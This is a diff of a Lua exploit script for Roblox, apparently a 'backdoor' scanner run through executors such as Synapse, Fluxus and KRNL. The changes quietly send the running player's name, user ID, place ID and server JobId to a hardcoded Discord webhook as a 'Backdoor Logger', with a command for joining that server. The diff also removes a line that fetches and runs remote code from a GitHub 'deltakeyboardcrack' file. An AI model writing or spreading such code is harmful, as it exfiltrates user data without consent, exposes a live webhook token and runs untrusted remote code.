@@ -2805,51 +2805,53 @@ end)
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
 
-local request = 
-    (syn and syn.request) or 
-    (http and http.request) or 
-    http_request or 
-    (fluxus and fluxus.request) or 
+local request =
+    (syn and syn.request) or
+    (http and http.request) or
+    http_request or
+    (fluxus and fluxus.request) or
+    (krnl and krnl.request) or
     request
 
+local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. localPlayer.UserId .. "&width=420&height=420&format=png"
+local webhookUrl = "https://discord.com/api/webhooks/1379334256429367326/lbYjlMEpSD48QZ0tKKKoh6fc3t-_NpUJPvwsm6s5c__C5r-ZwxfnFfm7uPg0M9FMfjwC"
+
 if request then
-    local webhookUrl = "https://discord.com/api/webhooks/1379334256429367326/lbYjlMEpSD48QZ0tKKKoh6fc3t-_NpUJPvwsm6s5c__C5r-ZwxfnFfm7uPg0M9FMfjwC"
-    
     local embed = {
-        title = "Backdoored game Logged",
-        description = "A new player has injected the script.",
-        color = 0x00ffcc, -- teal/cyan
+        title = "- Backdoor Logger -",
+        color = 0x00ffcc,
+        thumbnail = { url = headshotUrl },
         fields = {
             {
-                name = "Username",
-                value = localPlayer.Name,
-                inline = true
-            },
-	    {
-                name = "Display Name",
-                value = localPlayer.DisplayName,
-                inline = true
+                name = "📍 Place Information",
+                value = "**Name:** " .. game.Name ..
+                        "\n**Active Players:** " .. tostring(#Players:GetPlayers()) ..
+                        "\n**Place Id:** " .. game.PlaceId,
+                inline = false
             },
             {
-                name = "User ID",
-                value = tostring(localPlayer.UserId),
-                inline = true
+                name = "🔗 Join Methods",
+                value = "[Game Link](https://www.roblox.com/games/" .. game.PlaceId .. ")",
+                inline = false
             },
             {
-                name = "Game Link",
-                value = "https://www.roblox.com/games/" .. game.PlaceId,
+                name = "📜 Code",
+                value = "```javascript\nRoblox.GameLauncher.joinGameInstance(" ..
+                        game.PlaceId .. ', "' .. game.JobId .. '")\n```',
                 inline = false
             }
         },
         footer = {
-            text = "c00lkidd.exe game Logger"
+            text = "Injected by " .. localPlayer.Name .. "/" .. localPlayer.DisplayName,
+            icon_url = headshotUrl
         },
         timestamp = DateTime.now():ToIsoDate()
     }
 
-    local payload = {
-        username = "Game Log",
-        embeds = {embed}
+    local data = {
+        username = "Game Logger",
+        avatar_url = headshotUrl,
+        embeds = { embed }
     }
 
     request({
@@ -2858,15 +2860,9 @@ if request then
         Headers = {
             ["Content-Type"] = "application/json"
         },
-        Body = HttpService:JSONEncode(payload)
+        Body = HttpService:JSONEncode(data)
     })
 end
-			local executor = identifyexecutor()
-			 if executor == "Delta" then 
-		             return
-			 else
-			   loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt"))()
-			end
 	    else
 			script.Parent.Framee.Check.Text = "No backdoor :("
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
